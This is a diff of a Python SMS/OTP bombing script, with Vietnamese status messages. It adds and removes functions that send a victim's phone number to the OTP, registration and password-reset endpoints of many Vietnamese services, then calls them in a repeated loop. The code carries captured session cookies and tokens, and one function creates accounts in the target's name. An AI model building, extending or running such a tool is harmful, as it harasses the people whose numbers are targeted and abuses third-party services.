-        # 'cookie': 'XSRF-TOKEN=eyJpdiI6InFORmE5Yzc2Q0hOOTRLS1JtbjFvRnc9PSIsInZhbHVlIjoiRnU1Qy9sdnI5WnlZZ1VYSU9XMVR1eUtNeUhlYWRac2N5dHljakVmRmRXMjlaQUlmMWFtY3AyVEdRVitHcVNJSFpldUV4ajQ4UC91NnFxS0NBZ21lRUNkeGlYSGxhTDFjYXFUOWRobStUOGhiWk5mM3dtV3hwZjE1R2lzaDdwQlkiLCJtYWMiOiI2YTA5NjQwYzllNGE2ZTQyM2JmMzdlY2M5NTJkMmRhZDJjNGFjY2VhNzRiMWYyMTExZmVjNzE5ODMyZTgwM2JkIiwidGFnIjoiIn0%3D; vulcanovn_session=eyJpdiI6IjhIZ3krcHZOK3F5OWx2VVVvd0Y1cmc9PSIsInZhbHVlIjoiaWJhWnM4VUN0SDE2MnlDYTlMSFVHRzFlYnVXZ1BqNWJsYk5Cblk3ckR4ZGdwVVVCQmxOMzhvL3ZGWUgvbitZaTdnbnU3STB3Yzc0OFZpWElHUnJQeVp1bFVldGVlTlZBS0kzZGtNQ2ptMmdhUDVFckFTUjUyWVBsbTgwSUdDOTQiLCJtYWMiOiI2ZTMyZjQ2ZjFhYmY5ZjQ0MTQzNjAzMGI5Mjg3NjM2NjkyNWNhMTAxZWI0NDFiYzkwMDhmZTdlYjMzZjhlYjA4IiwidGFnIjoiIn0%3D; utm_values=eyJpdiI6IkQ2dHVKT3poMkhkMUlQY2NmMHNLNmc9PSIsInZhbHVlIjoidndvekp5aU8zYmpoaWt4ZVZCVHF0KzMwTlQrdklWMThvNXZydnlwbDV3VW9Fa3Z0Z3FrOEY2N1gwMjNGbGxNTSIsIm1hYyI6ImRjNDQ1MWZmOTQ3ZGNmYjhjNzFiMDk0NmY4MzZiMDg2ZjgxMTZkMDkxOTJkNTJlMDRlZTQxNjM1ZDhlYjAzYmYiLCJ0YWciOiIifQ%3D%3D',
-        'origin': 'https://vulcano.vn',
-        'priority': 'u=0, i',
-        'referer': 'https://vulcano.vn/forgot-password',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'document',
-        'sec-fetch-mode': 'navigate',
-        'sec-fetch-site': 'same-origin',
-        'sec-fetch-user': '?1',
-        'upgrade-insecure-requests': '1',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-    }
-
-    data = {
-        '_token': '9Dhr621QSdLEIjaiPEWHx7SUutyy28qa30K6ddsd',
-        'phone_or_email': sdt,
-    }
-
-    try:
-        response = requests.post('https://vulcano.vn/password/send', cookies=cookies, headers=headers, data=data)
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("VULCANORESET | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("VULCANORESET | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
-def frontrow():
-    cookies = {
-        'PHPSESSID': 'tafp43hvfnof37djk04o1ghkui',
-        'form_key': 'H7L5n8XwH2yMeSgY',
-        'mage-banners-cache-storage': '%7B%7D',
-        'mage-cache-storage': '%7B%7D',
-        'mage-cache-storage-section-invalidation': '%7B%7D',
-        'form_key': 'H7L5n8XwH2yMeSgY',
-        'mage-cache-sessid': 'true',
-        'recently_viewed_product': '%7B%7D',
-        'product_data_storage': '%7B%7D',
-        'recently_viewed_product_previous': '%7B%7D',
-        'recently_compared_product': '%7B%7D',
-        'recently_compared_product_previous': '%7B%7D',
-        'wishlist': 'gLEDyWwVr7acVuNlapJtOZWJ1kzBuQoK',
-        'mgn_menu_category_13': '20',
-        'mage-messages': '',
-        'private_content_version': 'a0b4f1a78a7be530b28ac99fe6953ce9',
-        'section_data_ids': '%7B%22customer%22%3A1723353049%2C%22wishlist%22%3A1723353050%7D',
-    }
-
-    headers = {
-        'accept': 'application/json, text/javascript, */*; q=0.01',
-        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        # 'cookie': 'PHPSESSID=tafp43hvfnof37djk04o1ghkui; form_key=H7L5n8XwH2yMeSgY; mage-banners-cache-storage=%7B%7D; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; form_key=H7L5n8XwH2yMeSgY; mage-cache-sessid=true; recently_viewed_product=%7B%7D; product_data_storage=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; wishlist=gLEDyWwVr7acVuNlapJtOZWJ1kzBuQoK; mgn_menu_category_13=20; mage-messages=; private_content_version=a0b4f1a78a7be530b28ac99fe6953ce9; section_data_ids=%7B%22customer%22%3A1723353049%2C%22wishlist%22%3A1723353050%7D',
-        'origin': 'https://front-row.com',
-        'priority': 'u=1, i',
-        'referer': 'https://front-row.com/customer/account/create/',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-        'x-requested-with': 'XMLHttpRequest',
-    }
-
-    data = {
-        'number_phone': sdt_chuyen_doi,
-        'country_code': '+84',
-        'form_key': 'H7L5n8XwH2yMeSgY',
-        'currentUrl': 'https://front-row.com/customer/account/create/',
-    }
-
-    try:
-        response = requests.post('https://front-row.com/smsmarketing/customer/sendOTP', cookies=cookies, headers=headers, data=data)
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("FRONTROW | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("FRONTROW | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
 def bibomart():
     headers = {
         'accept': 'application/json, text/plain, */*',
@@ -4978,88 +4047,6 @@ def sbiz():
         print("SBIZ | TRẠNG THÁI : THÀNH CÔNG")
     except requests.exceptions.RequestException:
         print("SBIZ | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
-def hachihachi():
-    cookies = {
-        'ASP.NET_SessionId': 'dgmsabih3drxg44o44a4xo0b',
-        'Language': 'vi-VN',
-    }
-
-    headers = {
-        'Accept': 'application/json, text/plain, */*',
-        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-        'Access-Control-Allow-Origin': '*',
-        'Authorization': 'Bearer',
-        'Compunknown': '',
-        'Connection': 'keep-alive',
-        'Content-Type': 'application/json;charset=UTF-8',
-        # 'Cookie': 'ASP.NET_SessionId=dgmsabih3drxg44o44a4xo0b; Language=vi-VN',
-        'Data-type': 'json',
-        'FormURL': '',
-        'Language': 'vi-VN',
-        'Origin': 'https://hachihachi.com.vn',
-        'Referer': 'https://hachihachi.com.vn/dang-ky?type=34',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-origin',
-        'Skey': 'ccfbc3ad0cda421dbd4b71506f16eba5',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-        'UserName': '',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-    }
-
-    json_data = {
-        'Email': '',
-        'UserName': sdt,
-        'Password': 1723356340457,
-        'PhoneNumber': sdt,
-        'FullName': 'quoc tien huy',
-    }
-
-    try:
-        response = requests.post('https://hachihachi.com.vn/api/profile/RegisterUser', cookies=cookies, headers=headers, json=json_data, verify=False)
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("HACHIHACHI | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("HACHIHACHI | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
-def hachihachiresend():
-    headers = {
-        'accept': 'application/json, text/plain, */*',
-        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-        'access-control-allow-origin': '*',
-        'authorization': 'Bearer',
-        'compunknown': '',
-        'content-type': 'application/json;charset=UTF-8',
-        'data-type': 'json',
-        'formurl': '',
-        'language': 'vi-VN',
-        'origin': 'https://hachihachi.com.vn',
-        'priority': 'u=1, i',
-        'referer': 'https://hachihachi.com.vn/',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'skey': 'ccfbc3ad0cda421dbd4b71506f16eba5',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-        'username': '',
-    }
-
-    json_data = {
-        'PhoneNumber': sdt,
-    }
-
-    try:
-        response = requests.post('https://identity.hachihachi.com.vn/identity/getactivecode', headers=headers, json=json_data)
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("HACHIHACHIRESEND | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("HACHIHACHIRESEND | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
 def thieuhoa():
     cookies = {
@@ -5320,6 +4307,149 @@ def leflair():
     except requests.exceptions.RequestException:
         print("LEFLAIR | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
+def mocha35():
+    url = "https://v2sslapimocha35.mocha.com.vn/ReengBackendBiz/genotp/v32"
+
+    payload = f"clientType=ios&countryCode=VN&device=iPhone15%2C3&os_version=iOS_17.0.2&platform=ios&revision=11224&username={sdt}&version=1.28"
+
+    headers = {
+    'User-Agent': "mocha/1.28 (iPhone; iOS 17.0.2; Scale/3.00)",
+    'Content-Type': "application/x-www-form-urlencoded",
+    'uuid': "B4DD9661-2B0B-418F-B953-6AE71C0373EC",
+    'APPNAME': "MC35",
+    'mocha-api': "",
+    'countryCode': "VN",
+    'languageCode': "vi",
+    'Accept-Language': "vi-VN;q=1"
+    }
+
+    try:
+        response = requests.post(url, data=payload, headers=headers)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("MOCHA35 | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("MOCHA35 | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def bibabo():
+    url = "https://one.bibabo.vn/api/v1/login/otp/createOtp"
+
+    params = {
+    'phone': sdt,
+    'reCaptchaToken': "undefined",
+    'appId': "7",
+    'version': "2"
+    }
+
+    headers = {
+    'User-Agent': "bibabo/522 CFNetwork/1474 Darwin/23.0.0",
+    'Accept': "application/json, text/plain, */*",
+    'accept-language': "vi-VN,vi;q=0.9"
+    }
+
+    try:
+        response = requests.get(url, params=params, headers=headers)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("BIBABO | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("BIBABO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def vayvnd():
+    headers = {
+        'accept': 'application/json',
+        'accept-language': 'vi-VN',
+        'content-type': 'application/json; charset=utf-8',
+        'dnt': '1',
+        'origin': 'https://vayvnd.vn',
+        'priority': 'u=1, i',
+        'referer': 'https://vayvnd.vn/',
+        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'site-id': '3',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
+    }
+
+    json_data = {
+        'login': sdt,
+        'trackingId': 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
+    }
+
+    try:
+        response = requests.post('https://api.vayvnd.vn/v2/users/password-reset', headers=headers, json=json_data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("VAYVND | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("VAYVND | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def xanhsm2():
+    url = "https://api.gsm-api.net/auth/v1/public/otp/send"
+
+    params = {
+    'aud': "user_app",
+    'platform': "ios"
+    }
+
+    payload = json.dumps({
+    "is_forgot_password": False,
+    "phone": sdt_chuyen_doi,
+    "provider": "VIET_GUYS"
+    })
+
+    headers = {
+    'User-Agent': "UserApp/3.15.0 (com.gsm.customer; build:89; iOS 17.0.2) Alamofire/5.9.1",
+    'Accept': "application/json",
+    'Accept-Encoding': "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
+    'Content-Type': "application/json",
+    'app-version-label': "3.15.0",
+    'app-build-number': "89",
+    'accept-language': "vi",
+    'platform': "iOS",
+    'aud': "user_app"
+    }
+
+    try:
+        response = requests.post(url, params=params, data=payload, headers=headers)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("XANHSM2 | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("XANHSM2 | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def xanhsmzl():
+    url = "https://api.gsm-api.net/auth/v1/public/otp/send"
+
+    params = {
+    'platform': "ios",
+    'aud': "user_app"
+    }
+
+    payload = json.dumps({
+    "phone": sdt_chuyen_doi,
+    "is_forgot_password": False,
+    "provider": "ZNS_ZALO"
+    })
+
+    headers = {
+    'User-Agent': "UserApp/3.15.0 (com.gsm.customer; build:89; iOS 17.0.2) Alamofire/5.9.1",
+    'Accept': "application/json",
+    'Accept-Encoding': "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
+    'Content-Type': "application/json",
+    'app-version-label': "3.15.0",
+    'app-build-number': "89",
+    'accept-language': "vi",
+    'platform': "iOS",
+    'aud': "user_app"
+    }
+
+    try:
+        response = requests.post(url, params=params, data=payload, headers=headers)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("XANHSMZL | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("XANHSMZL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
 for _ in range(count):
     tv360()
     time.sleep(0.3)
@@ -5346,12 +4476,6 @@ for _ in range(count):
     tokyolife()
     time.sleep(0.3)
     vieon()
-    time.sleep(0.3)
-    fptreg()
-    time.sleep(0.3)
-    fptreset()
-    time.sleep(0.3)
-    fptresend()
     time.sleep(0.3)
     winmart()
     time.sleep(0.3)
@@ -5388,8 +4512,6 @@ for _ in range(count):
     acfc()
     time.sleep(0.3)
     fptlongchauzl()
-    time.sleep(0.3)
-    thuocsi()
     time.sleep(0.3)
     pantio()
     time.sleep(0.3)
